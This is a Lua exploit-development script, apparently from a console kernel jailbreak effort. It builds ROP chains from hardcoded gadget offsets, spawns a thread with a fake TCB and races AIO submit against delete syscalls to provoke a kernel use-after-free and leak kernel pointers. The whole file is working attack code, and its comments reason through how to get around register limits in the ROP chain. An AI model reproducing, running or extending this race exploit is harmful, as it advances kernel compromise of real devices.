-- CRASH_CLASS: HIGH
-- PROBE 69g: submit-during-delete — 669 reclaims slots freed by 662
--
-- 65l confirmed double-STATUS on 662-vs-662, but the D exclusive lock
-- serializes entry_dispose so memory is freed exactly once.
--
-- THIS probe races 662 (delete) vs 669 (submit): delete frees R sub-objects
-- from the 64B UMA bucket while submit allocates new ones from the same
-- bucket. If submit reclaims a slot that delete still holds a pointer to,
-- delete's continued operation corrupts the new object → real UAF.
--
-- Detection:
--   1. New submit IDs that collide with deleted IDs (slot reuse)
--   2. Delete states showing impossible values (operated on reclaimed memory)
--   3. Kernel pointers in new submit result buffers (freed object residue)

print("=== PROBE 69g: submit-during-delete race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- ROP gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- /dev/zero fd for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- Fake TCB for children
local tcb_page = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(tcb_page) + i, uint64(N(tcb_page))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb_page)))

local BATCH = 16
local SUBMIT_PER_CHILD = 32
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- [A] Sanity: single submit-poll-delete cycle
print("")
print("[A] sanity check")
local tid = submit_one()
print("  submit id=0x" .. string.format("%X", tid))
poll_one(tid)
wd(N(one_id), tid); wd(N(one_st), 0xDEAD)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
print("  delete state=0x" .. string.format("%X", rd(N(one_st)) or 0))
if not alive() then print("DEAD after sanity"); return end

-- Shared buffers for the race
local del_ids     = memory.alloc(4 * BATCH + 0x10)
local del_states  = memory.alloc(4 * BATCH + 0x10)
local marker_del  = memory.alloc(8)
local marker_sub  = memory.alloc(8)
local del_ret     = memory.alloc(8)

-- Child B (submitter): needs its own request struct, data buf, result buf, id array
-- All pre-allocated so the child just does syscalls
local sub_reqs    = memory.alloc(0x30)
local sub_data    = memory.alloc(0x1000)
local sub_result  = memory.alloc(0x100)
local sub_ids     = memory.alloc(4 * SUBMIT_PER_CHILD + 0x10)
local sub_count   = memory.alloc(8)

-- Pre-fill the submit request struct (child reuses it for each 669 call)
wq(N(sub_reqs), uint64(0))
wq(N(sub_reqs) + 8, uint64(16))
local sdh, sdl = get_hi_lo(uint64(N(sub_data)))
wd(N(sub_reqs) + 0x10, sdl); wd(N(sub_reqs) + 0x14, sdh)
local srh, srl = get_hi_lo(uint64(N(sub_result)))
wd(N(sub_reqs) + 0x18, srl); wd(N(sub_reqs) + 0x1C, srh)
wd(N(sub_reqs) + 0x20, fd_zero); wd(N(sub_reqs) + 0x24, 0)

-- [B] Race loop
print("")
print("[B] RACE — delete child vs submit child, " .. BATCH .. " IDs × 20 iters")

local ITERS = 20
local total_collisions = 0
local total_anomalies = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- Submit + poll BATCH requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < 2 then
        print(string.format("  iter %d: only got %d IDs, skip", iter, #ids))
        break
    end
    local count = #ids

    -- Write shared delete ID array + sentinel states
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(del_states) + i * 4, 0xDDDDDDDD)
    end
    wq(N(marker_del), uint64(0))
    wq(N(marker_sub), uint64(0))
    wq(N(del_ret), uint64(0xFFFFFFFF))
    wq(N(sub_count), uint64(0))

    -- Clear submit child's ID output
    for i = 0, SUBMIT_PER_CHILD - 1 do
        wd(N(sub_ids) + i * 4, 0)
    end

    -- Child A (deleter): sysarch TCB → marker → 662(del_ids, count, del_states) → thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- sysarch(SET_FSBASE=129, &tcb_ptr)
    emA(g_pop_rdi); emA(uint64(129))
    emA(g_pop_rsi); emA(uint64(N(tcb_ptr)))
    emA(g_pop_rax); emA(uint64(165))
    emA(stub)
    -- marker
    emA(g_pop_rax); emA(uint64(0xDE1E7E01))
    emA(g_pop_rdi); emA(uint64(N(marker_del)))
    emA(g_mov_m_rax)
    -- 662 delete
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(del_states)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- save return value
    emA(g_pop_rdi); emA(uint64(N(del_ret)))
    emA(g_mov_m_rax)
    -- thr_exit(0)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B (submitter): sysarch TCB → marker → loop: 669 submit × SUBMIT_PER_CHILD → thr_exit
    -- Each iteration: 669(1, sub_reqs, 1, 1, &sub_ids[i])
    -- Store completed count at sub_count
    local stk_B = memory.alloc(0x8000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x6000 - ((sb_B + 0x6000) % 16) - 8
    for i = 0, 0x5FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    -- sysarch TCB
    emB(g_pop_rdi); emB(uint64(129))
    emB(g_pop_rsi); emB(uint64(N(tcb_ptr)))
    emB(g_pop_rax); emB(uint64(165))
    emB(stub)
    -- marker
    emB(g_pop_rax); emB(uint64(0x5B517E01))
    emB(g_pop_rdi); emB(uint64(N(marker_sub)))
    emB(g_mov_m_rax)
    -- submit loop (unrolled)
    for si = 0, SUBMIT_PER_CHILD - 1 do
        -- 669(cmd=1, sub_reqs, count=1, class=1, &sub_ids[si])
        emB(g_pop_rdi); emB(uint64(1))
        emB(g_pop_rsi); emB(uint64(N(sub_reqs)))
        emB(g_pop_rdx); emB(uint64(1))
        emB(g_pop_rcx); emB(uint64(1))
        -- r8 = &sub_ids[si] — no pop_r8 gadget, use the 5th arg slot
        -- fn_addr passes args positionally; arg5 goes through rcx on FreeBSD
        -- Actually: FreeBSD amd64 syscall ABI: rdi, rsi, rdx, r10, r8, r9
        -- But fn_addr is not a raw syscall — it's the loader's wrapper
        -- The 65l pattern uses stub(arg1..arg6) positionally through the Lua call
        -- So we need 5 args: 669(1, reqs, 1, 1, ids_ptr)
        -- With only 4 controlled regs (rdi,rsi,rdx,rcx), arg5 is a problem
        --
        -- WORKAROUND: Call 669 from main thread to pre-fill, and have child
        -- only do the delete. But that defeats the race...
        --
        -- Alternative: use fn_addr(stub, 669, 1, reqs, 1, 1, ids_ptr) pattern
        -- But child can't call native.fcall_with_rax — that's Lua-only
        --
        -- Key insight: make_syscall / stub takes up to 6 args in the ROP.
        -- The child passes through stub which is fn_addr. Looking at 65l:
        -- it sets rdi, rsi, rdx via pop gadgets, then rax=syscall_no, then
        -- calls stub. The fn_addr stub copies rdi→arg1, rsi→arg2, rdx→arg3
        -- but how does it pass arg4, arg5, arg6?
        --
        -- From 384b: "pop_rcx_ret(+0xE64)" and the 4-arg max note says
        -- "No pop_r8/r9 found — max 4 args"
        --
        -- So via ROP we can pass: rdi(arg1), rsi(arg2), rdx(arg3), rcx(arg4).
        -- The 5th argument (ids_out_ptr) for 669 CANNOT be set from child ROP!
        --
        -- This means the submit child must use a different strategy:
        -- Have the ids output go to a FIXED address (one per submit).
        -- Actually — look at how 669 works with the Lua wrapper:
        -- mk(669)(arg1, arg2, arg3, arg4, arg5)
        -- The loader's fn_addr stub passes args via the FreeBSD syscall ABI.
        -- If stub is a "syscall; ret" in libkernel, args map to:
        -- rax=syscall_no, rdi=arg1, rsi=arg2, rdx=arg3, r10=arg4, r8=arg5, r9=arg6
        --
        -- We need pop_r10 and pop_r8. We don't have those.
        -- BUT: syscall number goes in rax. The OTHER args:
        -- FreeBSD: rdi, rsi, rdx, r10, r8, r9
        -- We have pop_rdi, pop_rsi, pop_rdx, pop_rcx (NOT r10!)
        --
        -- Wait — fn_addr is NOT "syscall;ret". It's the Lua loader's
        -- internal function call stub. It interprets the metadata differently.
        -- Let's not fight this. Use a simpler approach:
        -- The DELETER child races against MAIN THREAD submits.
        break
    end
    -- Since we can't do 5-arg syscalls from child ROP, restructure:
    -- Main thread submits in a tight loop (669 from Lua) while child deletes.
    -- This still races because the child's 662 runs in kernel while main
    -- thread's 669 runs in kernel concurrently.

    -- Erase child B's ROP — we'll submit from main thread instead
    -- Re-do: only one child (deleter), main thread submits concurrently

    -- Spawn deleter child
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x08, uint64(0))
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)

    -- Main thread: tight submit loop while child is deleting
    local new_ids = {}
    for si = 1, SUBMIT_PER_CHILD do
        local nid = submit_one()
        if nid ~= 0 then table.insert(new_ids, nid) end
    end

    -- Wait for child to finish
    for w = 1, 80000 do local _ = rd(sb_A) end

    -- Check results
    local del_ran = (N(rq(N(marker_del))) ~= 0)
    local del_rv = rq(N(del_ret))

    -- Check delete states
    local del_ok = 0
    local del_fail = 0
    local del_sentinel = 0
    local del_weird = 0
    for i = 0, count - 1 do
        local st = rd(N(del_states) + i * 4) or 0xDDDDDDDD
        if st == 0 then
            del_ok = del_ok + 1
        elseif st == 0xDDDDDDDD then
            del_sentinel = del_sentinel + 1
        elseif st == 0x80020003 or st == 0x80020010 then
            del_fail = del_fail + 1
        else
            del_weird = del_weird + 1
        end
    end

    -- Check for ID collisions: did any new submit reuse a deleted slot?
    local old_set = {}
    for _, id in ipairs(ids) do
        local slot = id % 8192
        old_set[slot] = id
    end
    local collisions = 0
    local reused_ids = {}
    for _, nid in ipairs(new_ids) do
        local slot = nid % 8192
        if old_set[slot] then
            collisions = collisions + 1
            table.insert(reused_ids, {old = old_set[slot], new = nid})
        end
    end

    -- Scan new submit result buffers for kernel pointers
    local kptr_count = 0
    for _, nid in ipairs(new_ids) do
        poll_one(nid)
    end

    total_collisions = total_collisions + collisions
    total_anomalies = total_anomalies + del_weird

    local tag = ""
    if collisions > 0 then tag = " *** SLOT REUSE ***" end
    if del_weird > 0 then tag = tag .. " *** ANOMALOUS STATE ***" end

    if collisions > 0 or del_weird > 0 or iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: del_ok=%d fail=%d sentinel=%d weird=%d | new=%d collisions=%d%s",
            iter, del_ok, del_fail, del_sentinel, del_weird, #new_ids, collisions, tag))
        if del_weird > 0 then
            for i = 0, count - 1 do
                local st = rd(N(del_states) + i * 4) or 0
                if st ~= 0 and st ~= 0xDDDDDDDD and st ~= 0x80020003 and st ~= 0x80020010 then
                    print(string.format("    weird state[%d] id=0x%X st=0x%08X", i, ids[i+1], st))
                end
            end
        end
        if collisions > 0 then
            for _, p in ipairs(reused_ids) do
                print(string.format("    slot reuse: old=0x%X new=0x%X (slot=%d)",
                    p.old, p.new, p.new % 8192))
            end
        end
    elseif iter == 4 then print("  ...") end

    -- Clean up: delete new IDs so we don't leak AIO objects
    for _, nid in ipairs(new_ids) do
        wd(N(one_id), nid); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:       %d", ITERS))
print(string.format("  IDs per iter:     %d", BATCH))
print(string.format("  submits per iter: %d", SUBMIT_PER_CHILD))
print(string.format("  slot collisions:  %d", total_collisions))
print(string.format("  anomalous states: %d", total_anomalies))
print(string.format("  kernel pointers:  %d", total_kptrs))
print(string.format("  process:          %s", alive() and "ALIVE" or "DEAD"))

if total_collisions > 0 then
    print("")
    print("*** SLOT REUSE DETECTED — freed R sub-objects reclaimed by submit ***")
    print("Next: read back the reclaimed objects for residual kernel pointers")
elseif total_anomalies > 0 then
    print("")
    print("*** ANOMALOUS DELETE STATES — possible corruption ***")
else
    print("")
    print("No collisions or anomalies. Race window may be too narrow.")
    print("Try: increase SUBMIT_PER_CHILD, decrease BATCH, or add delay before child starts.")
end

print("")
print("=== 69g COMPLETE ===")
